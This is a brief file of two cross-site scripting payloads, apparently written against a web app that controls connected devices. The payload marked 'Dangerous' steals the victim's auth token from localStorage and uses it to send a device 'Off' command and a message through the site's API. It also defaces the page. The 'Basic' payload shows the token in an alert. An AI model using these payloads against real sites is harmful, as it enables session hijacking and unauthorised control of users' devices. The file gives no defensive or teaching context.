// Dangerous

<script>
var token = localStorage.getItem('token');
var device = '1FFSsC';
var commandID = 'gfx4R';
var command = 'Off';
var locID = 'ZLLLdL';
var sendTo = 'b';
var url = '/api/sendCommand?token=' + token;
var value = 'Device ' + device + ' sent command: ' + command;
$.ajax({
	type: "POST",
	url: url,
	data: {
		deviceID: device,
		locationID: locID,
		command: command,
		commandID: commandID
	}
}).done(function() {
	$('body').html('<h3>:)</h3>');
	url = '/api/sendMessage?token=' + token;
	$.ajax({
		type: "POST",
		url: url,
		data: {
			sendTo: sendTo,
			value: value
		}
	}).done(function() {
		console.log('Woot woot');
	});
});











// Basic

<script>
alert('This site is insecure: ' + localStorage.getItem('token'));